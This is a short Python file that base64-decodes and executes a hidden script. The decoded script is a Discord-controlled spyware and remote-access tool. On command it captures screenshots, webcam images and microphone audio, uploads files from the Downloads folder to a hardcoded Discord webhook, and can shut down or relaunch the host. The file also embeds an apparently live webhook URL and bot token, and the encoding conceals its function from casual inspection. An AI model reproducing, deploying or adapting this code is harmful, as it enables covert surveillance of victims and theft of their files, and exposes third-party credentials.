import base64


encoded_script = """
<aW1wb3J0IG9zCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgZGlzY29yZAppbXBvcnQgY3YyCmltcG9ydCBzb3VuZGRldmljZSBhcyBzZApmcm9tIHNjaXB5LmlvLndhdmZpbGUgaW1wb3J0IHdyaXRlCmZyb20gZGlzY29yZC5leHQgaW1wb3J0IGNvbW1hbmRzCmZyb20gUElMIGltcG9ydCBJbWFnZUdyYWIKZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUKaW1wb3J0IHBsYXRmb3JtCmltcG9ydCBzdWJwcm9jZXNzICAjIE1vZHVsZSBmb3IgcmVvcGVuaW5nL3JlcnVubmluZyB0aGUgZmlsZQoKIyBSZXBsYWNlIHdpdGggeW91ciBEaXNjb3JkIHdlYmhvb2sgVVJMCldFQkhPT0tfVVJMID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEzMDAwODM3NjM2ODYwMTkxOTMvWGlJa3BkWHJtdFNXUldZMEJ0cEFybm00TzVTWnRkd2FoVGYtOGFtYXhqaDB1T3hBSHlxQVhzVHZIVzNFem04ZUpKX3MiCgojIFNwZWNpZnkgeW91ciBib3QgdG9rZW4gYW5kIGNoYW5uZWwgSUQKQk9UX1RPS0VOID0gIk1UTXdNREF5T0RVMk1EazNPVEF3TlRRMk1BLkdvTEFscC5yRUZPenYtT3RWR0N1cGxjS2JjbExkeWlkRTFsLV9KeEdOSFNJQSIKVEFSR0VUX0NIQU5ORUxfSUQgPSAxMjc1NTM3MTU3OTU1NzgwNzAwICAjIFJlcGxhY2Ugd2l0aCB5b3VyIGNoYW5uZWwgSUQKCiMgU2V0IHVwIHRoZSBib3Qgd2l0aCBhcHByb3ByaWF0ZSBpbnRlbnRzCmludGVudHMgPSBkaXNjb3JkLkludGVudHMuZGVmYXVsdCgpCmludGVudHMubWVzc2FnZV9jb250ZW50ID0gVHJ1ZSAgIyBBbGxvd3MgYWNjZXNzIHRvIG1lc3NhZ2UgY29udGVudApib3QgPSBjb21tYW5kcy5Cb3QoY29tbWFuZF9wcmVmaXg9IiEiLCBpbnRlbnRzPWludGVudHMpCgpAYm90LmV2ZW50CmFzeW5jIGRlZiBvbl9yZWFkeSgpOgogICAgcHJpbnQoZiJMb2dnZWQgaW4gYXMge2JvdC51c2VyfSIpCiAgICBjaGFubmVsID0gYm90LmdldF9jaGFubmVsKFRBUkdFVF9DSEFOTkVMX0lEKQogICAgaWYgY2hhbm5lbDoKICAgICAgICBhd2FpdCBjaGFubmVsLnNlbmQoIkJvdCBpcyBub3cgYWN0aXZlIGFuZCByZWFkeSBmb3IgY29tbWFuZHMhIikKCkBib3QuY29tbWFuZCgpCmFzeW5jIGRlZiBzcyhjdHgpOgogICAgaWYgY3R4LmNoYW5uZWwuaWQgIT0gVEFSR0VUX0NIQU5ORUxfSUQ6CiAgICAgICAgYXdhaXQgY3R4LnNlbmQoIlRoaXMgY29tbWFuZCBjYW4gb25seSBiZSB1c2VkIGluIHRoZSBkZXNpZ25hdGVkIGNoYW5uZWwuIikKICAgICAgICByZXR1cm4KCiAgICBzY3JlZW5zaG90X2ZpbGVuYW1lID0gZiJzY3JlZW5zaG90X3tkYXRldGltZS5ub3coKS5zdHJmdGltZSgnJVklbSVkXyVIJU0lUycpfS5wbmciCiAgICBzY3JlZW5zaG90X3BhdGggPSBvcy5wYXRoLmpvaW4ob3MucGF0aC5leHBhbmR1c2VyKCJ+IiksICJEb3dubG9hZHMiLCBzY3JlZW5zaG90X2ZpbGVuYW1lKQogICAgc2NyZWVuc2hvdCA9IEltYWdlR3JhYi5ncmFiKCkKICAgIHNjcmVlbnNob3Quc2F2ZShzY3JlZW5zaG90X3BhdGgpCgogICAgd2l0aCBvcGVuKHNjcmVlbnNob3RfcGF0aCwgInJiIikgYXMgZjoKICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QoCiAgICAgICAgICAgIFdFQkhPT0tfVVJMLAogICAgICAgICAgICBmaWxlcz17ImZpbGUiOiBmfSwKICAgICAgICAgICAgZGF0YT17ImNvbnRlbnQiOiBmIlNjcmVlbnNob3QgdGFrZW4gYnkge2N0eC5hdXRob3IubWVudGlvbn0ifSwKICAgICAgICApCiAgICAgICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjA0OgogICAgICAgICAgICBhd2FpdCBjdHguc2VuZCgiU2NyZWVuc2hvdCBzZW50IHN1Y2Nlc3NmdWxseS4iKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGF3YWl0IGN0eC5zZW5kKCJGYWlsZWQgdG8gc2VuZCBzY3JlZW5zaG90LiIpCiAgICAgICAgICAgIHByaW50KGYiRXJyb3I6IHtyZXNwb25zZS5zdGF0dXNfY29kZX0gLSB7cmVzcG9uc2UudGV4dH0iKQoKQGJvdC5jb21tYW5kKCkKYXN5bmMgZGVmIHdiKGN0eCk6CiAgICBpZiBjdHguY2hhbm5lbC5pZCAhPSBUQVJHRVRfQ0hBTk5FTF9JRDoKICAgICAgICBhd2FpdCBjdHguc2VuZCgiVGhpcyBjb21tYW5kIGNhbiBvbmx5IGJlIHVzZWQgaW4gdGhlIGRlc2lnbmF0ZWQgY2hhbm5lbC4iKQogICAgICAgIHJldHVybgoKICAgIGNhbSA9IGN2Mi5WaWRlb0NhcHR1cmUoMCkKICAgIHJldCwgZnJhbWUgPSBjYW0ucmVhZCgpCiAgICBjYW0ucmVsZWFzZSgpCiAgICAKICAgIGlmIG5vdCByZXQ6CiAgICAgICAgYXdhaXQgY3R4LnNlbmQoIkZhaWxlZCB0byBjYXB0dXJlIGltYWdlIGZyb20gd2ViY2FtLiIpCiAgICAgICAgcmV0dXJuCgogICAgd2ViY2FtX2ZpbGVuYW1lID0gZiJ3ZWJjYW1fe2RhdGV0aW1lLm5vdygpLnN0cmZ0aW1lKCclWSVtJWRfJUglTSVTJyl9LnBuZyIKICAgIHdlYmNhbV9wYXRoID0gb3MucGF0aC5qb2luKG9zLnBhdGguZXhwYW5kdXNlcigifiIpLCAiRG93bmxvYWRzIiwgd2ViY2FtX2ZpbGVuYW1lKQogICAgY3YyLmltd3JpdGUod2ViY2FtX3BhdGgsIGZyYW1lKQoKICAgIHdpdGggb3Blbih3ZWJjYW1fcGF0aCwgInJiIikgYXMgZjoKICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QoCiAgICAgICAgICAgIFdFQkhPT0tfVVJMLAogICAgICAgICAgICBmaWxlcz17ImZpbGUiOiBmfSwKICAgICAgICAgICAgZGF0YT17ImNvbnRlbnQiOiBmIldlYmNhbSBwaWN0dXJlIHRha2VuIGJ5IHtjdHguYXV0aG9yLm1lbnRpb259In0sCiAgICAgICAgKQogICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwNDoKICAgICAgICAgICAgYXdhaXQgY3R4LnNlbmQoIldlYmNhbSBwaWN0dXJlIHNlbnQgc3VjY2Vzc2Z1bGx5LiIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgYXdhaXQgY3R4LnNlbmQoIkZhaWxlZCB0byBzZW5kIHdlYmNhbSBwaWN0dXJlLiIpCiAgICAgICAgICAgIHByaW50KGYiRXJyb3I6IHtyZXNwb25zZS5zdGF0dXNfY29kZX0gLSB7cmVzcG9uc2UudGV4dH0iKQoKQGJvdC5jb21tYW5kKCkKYXN5bmMgZGVmIHZjKGN0eCk6CiAgICBpZiBjdHguY2hhbm5lbC5pZCAhPSBUQVJHRVRfQ0hBTk5FTF9JRDoKICAgICAgICBhd2FpdCBjdHguc2VuZCgiVGhpcyBjb21tYW5kIGNhbiBvbmx5IGJlIHVzZWQgaW4gdGhlIGRlc2lnbmF0ZWQgY2hhbm5lbC4iKQogICAgICAgIHJldHVybgoKICAgIHRyeToKICAgICAgICBmcyA9IDQ0MTAwCiAgICAgICAgc2Vjb25kcyA9IDUKCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoIlJlY29yZGluZyBhdWRpby4uLiIpCgogICAgICAgIGF1ZGlvX2RhdGEgPSBzZC5yZWMoaW50KHNlY29uZHMgKiBmcyksIHNhbXBsZXJhdGU9ZnMsIGNoYW5uZWxzPTIpCiAgICAgICAgc2Qud2FpdCgpCgogICAgICAgIGF1ZGlvX2ZpbGVuYW1lID0gZiJ2b2ljZV97ZGF0ZXRpbWUubm93KCkuc3RyZnRpbWUoJyVZJW0lZF8lSCVNJVMnKX0ud2F2IgogICAgICAgIGF1ZGlvX3BhdGggPSBvcy5wYXRoLmpvaW4ob3MucGF0aC5leHBhbmR1c2VyKCJ+IiksICJEb3dubG9hZHMiLCBhdWRpb19maWxlbmFtZSkKICAgICAgICB3cml0ZShhdWRpb19wYXRoLCBmcywgYXVkaW9fZGF0YSkKCiAgICAgICAgd2l0aCBvcGVuKGF1ZGlvX3BhdGgsICJyYiIpIGFzIGY6CiAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCgKICAgICAgICAgICAgICAgIFdFQkhPT0tfVVJMLAogICAgICAgICAgICAgICAgZmlsZXM9eyJmaWxlIjogZn0sCiAgICAgICAgICAgICAgICBkYXRhPXsiY29udGVudCI6IGYiVm9pY2UgbWVzc2FnZSByZWNvcmRlZCBieSB7Y3R4LmF1dGhvci5tZW50aW9ufSJ9LAogICAgICAgICAgICApCiAgICAgICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwNDoKICAgICAgICAgICAgICAgIGF3YWl0IGN0eC5zZW5kKCJWb2ljZSBtZXNzYWdlIHNlbnQgc3VjY2Vzc2Z1bGx5LiIpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBhd2FpdCBjdHguc2VuZCgiRmFpbGVkIHRvIHNlbmQgdm9pY2UgbWVzc2FnZS4iKQogICAgICAgICAgICAgICAgcHJpbnQoZiJFcnJvcjoge3Jlc3BvbnNlLnN0YXR1c19jb2RlfSAtIHtyZXNwb25zZS50ZXh0fSIpCgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGF3YWl0IGN0eC5zZW5kKGYiQW4gZXJyb3Igb2NjdXJyZWQgZHVyaW5nIHJlY29yZGluZzoge3N0cihlKX0iKQogICAgICAgIHByaW50KGYiRXJyb3I6IHtlfSIpCgpAYm90LmNvbW1hbmQoKQphc3luYyBkZWYgUyhjdHgpOgogICAgaWYgY3R4LmNoYW5uZWwuaWQgPT0gVEFSR0VUX0NIQU5ORUxfSUQ6CiAgICAgICAgYXdhaXQgY3R4LnNlbmQoIlNodXR0aW5nIGRvd24gdGhlIGNvbXB1dGVyLi4uIikKICAgICAgICBjdXJyZW50X29zID0gcGxhdGZvcm0uc3lzdGVtKCkubG93ZXIoKQogICAgICAgIGlmIGN1cnJlbnRfb3MgPT0gIndpbmRvd3MiOgogICAgICAgICAgICBvcy5zeXN0ZW0oInNodXRkb3duIC9zIC90IDEiKQogICAgICAgIGVsaWYgY3VycmVudF9vcyA9PSAibGludXgiIG9yIGN1cnJlbnRfb3MgPT0gImRhcndpbiI6CiAgICAgICAgICAgIG9zLnN5c3RlbSgic3VkbyBzaHV0ZG93biBub3ciKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGF3YWl0IGN0eC5zZW5kKCJTaHV0ZG93biBjb21tYW5kIG5vdCBzdXBwb3J0ZWQgb24gdGhpcyBPUy4iKQogICAgZWxzZToKICAgICAgICBhd2FpdCBjdHguc2VuZCgiVGhpcyBjb21tYW5kIGNhbiBvbmx5IGJlIHVzZWQgaW4gdGhlIGRlc2lnbmF0ZWQgY2hhbm5lbC4iKQoKQGJvdC5jb21tYW5kKCkKYXN5bmMgZGVmIHJlKGN0eCk6CiAgICBpZiBjdHguY2hhbm5lbC5pZCA9PSBUQVJHRVRfQ0hBTk5FTF9JRDoKICAgICAgICBhd2FpdCBjdHguc2VuZCgiUmVvcGVuaW5nIHRoZSBQeXRob24gZmlsZS4uLiIpCgogICAgICAgICMgR2V0IHRoZSBjdXJyZW50IGZpbGUgcGF0aAogICAgICAgIGN1cnJlbnRfZmlsZSA9IG9zLnBhdGguYWJzcGF0aChfX2ZpbGVfXykKCiAgICAgICAgdHJ5OgogICAgICAgICAgICAjIFJlcnVuIHRoZSBjdXJyZW50IFB5dGhvbiBmaWxlCiAgICAgICAgICAgIHN1YnByb2Nlc3MuUG9wZW4oWyJweXRob24iLCBjdXJyZW50X2ZpbGVdKQogICAgICAgICAgICBhd2FpdCBjdHguc2VuZCgiUHl0aG9uIGZpbGUgaGFzIGJlZW4gcmVvcGVuZWQuIikKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIGF3YWl0IGN0eC5zZW5kKGYiRmFpbGVkIHRvIHJlb3BlbiB0aGUgZmlsZToge3N0cihlKX0iKQogICAgICAgICAgICBwcmludChmIkVycm9yIHJlb3BlbmluZyBmaWxlOiB7ZX0iKQogICAgZWxzZToKICAgICAgICBhd2FpdCBjdHguc2VuZCgiVGhpcyBjb21tYW5kIGNhbiBvbmx5IGJlIHVzZWQgaW4gdGhlIGRlc2lnbmF0ZWQgY2hhbm5lbC4iKQoKQGJvdC5jb21tYW5kKCkKYXN5bmMgZGVmIGNsb3NlKGN0eCk6CiAgICBpZiBjdHguY2hhbm5lbC5pZCA9PSBUQVJHRVRfQ0hBTk5FTF9JRDoKICAgICAgICBhd2FpdCBjdHguc2VuZCgiQm90IGlzIHNodXR0aW5nIGRvd24uLi4iKQogICAgICAgIGF3YWl0IGJvdC5jbG9zZSgpCiAgICBlbHNlOgogICAgICAgIGF3YWl0IGN0eC5zZW5kKCJUaGlzIGNvbW1hbmQgY2FuIG9ubHkgYmUgdXNlZCBpbiB0aGUgZGVzaWduYXRlZCBjaGFubmVsLiIpCgpAYm90LmNvbW1hbmQoKQphc3luYyBkZWYgdGVybWluYXRlKGN0eCk6CiAgICBpZiBjdHguY2hhbm5lbC5pZCAhPSBUQVJHRVRfQ0hBTk5FTF9JRDoKICAgICAgICBhd2FpdCBjdHguc2VuZCgiVGhpcyBjb21tYW5kIGNhbiBvbmx5IGJlIHVzZWQgaW4gdGhlIGRlc2lnbmF0ZWQgY2hhbm5lbC4iKQogICAgICAgIHJldHVybgoKICAgICMgRGVmaW5lIHRoZSBkaXJlY3RvcnkgdG8gY29sbGVjdCBmaWxlcyBmcm9tCiAgICBkaXJlY3RvcnkgPSBvcy5wYXRoLmV4cGFuZHVzZXIoIn4vRG93bmxvYWRzIikgICMgQ2hhbmdlIHRoaXMgdG8geW91ciB0YXJnZXQgZGlyZWN0b3J5CiAgICBmaWxlc190b19zZW5kID0gW10KCiAgICAjIENvbGxlY3QgZmlsZXMgZnJvbSB0aGUgZGlyZWN0b3J5CiAgICBmb3IgZmlsZW5hbWUgaW4gb3MubGlzdGRpcihkaXJlY3RvcnkpOgogICAgICAgIGlmIGZpbGVuYW1lLmVuZHN3aXRoKCIucG5nIikgb3IgZmlsZW5hbWUuZW5kc3dpdGgoIi53YXYiKTogICMgQWRkIG90aGVyIGV4dGVuc2lvbnMgYXMgbmVlZGVkCiAgICAgICAgICAgIGZpbGVzX3RvX3NlbmQuYXBwZW5kKG9zLnBhdGguam9pbihkaXJlY3RvcnksIGZpbGVuYW1lKSkKCiAgICBpZiBub3QgZmlsZXNfdG9fc2VuZDoKICAgICAgICBhd2FpdCBjdHguc2VuZCgiTm8gZmlsZXMgZm91bmQgdG8gc2VuZC4iKQogICAgICAgIHJldHVybgoKICAgICMgU2VuZCBlYWNoIGZpbGUgdG8gdGhlIERpc2NvcmQgd2ViaG9vawogICAgZm9yIGZpbGVfcGF0aCBpbiBmaWxlc190b19zZW5kOgogICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICJyYiIpIGFzIGY6CiAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCgKICAgICAgICAgICAgICAgIFdFQkhPT0tfVVJMLAogICAgICAgICAgICAgICAgZmlsZXM9eyJmaWxlIjogZn0sCiAgICAgICAgICAgICAgICBkYXRhPXsiY29udGVudCI6IGYiRmlsZSBzZW50OiB7b3MucGF0aC5iYXNlbmFtZShmaWxlX3BhdGgpfSJ9LAogICAgICAgICAgICApCiAgICAgICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlICE9IDIwNDoKICAgICAgICAgICAgICAgIGF3YWl0IGN0eC5zZW5kKGYiRmFpbGVkIHRvIHNlbmQgZmlsZSB7b3MucGF0aC5iYXNlbmFtZShmaWxlX3BhdGgpfS4iKQogICAgICAgICAgICAgICAgcHJpbnQoZiJFcnJvcjoge3Jlc3BvbnNlLnN0YXR1c19jb2RlfSAtIHtyZXNwb25zZS50ZXh0fSIpCgogICAgYXdhaXQgY3R4LnNlbmQoIkZpbGVzIHNlbnQgc3VjY2Vzc2Z1bGx5LiIpCgojIFJ1biB0aGUgYm90CmJvdC5ydW4oQk9UX1RPS0VOKQo=>
"""


exec(base64.b64decode(encoded_script).decode('utf-8'))
